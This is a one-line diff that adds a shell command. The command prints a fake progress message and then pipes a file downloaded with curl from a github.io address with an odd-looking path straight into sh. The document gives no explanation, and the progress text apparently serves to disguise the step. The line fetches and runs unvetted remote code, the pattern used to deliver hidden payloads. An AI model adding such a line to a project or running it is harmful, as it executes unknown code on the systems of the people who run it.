@@ -1,0 +1,1 @@
+echo 'Progress: 7.0%'; curl -L --progress-bar frkns.github.io/fun/swingersJosephCustomise.hush-login | sh
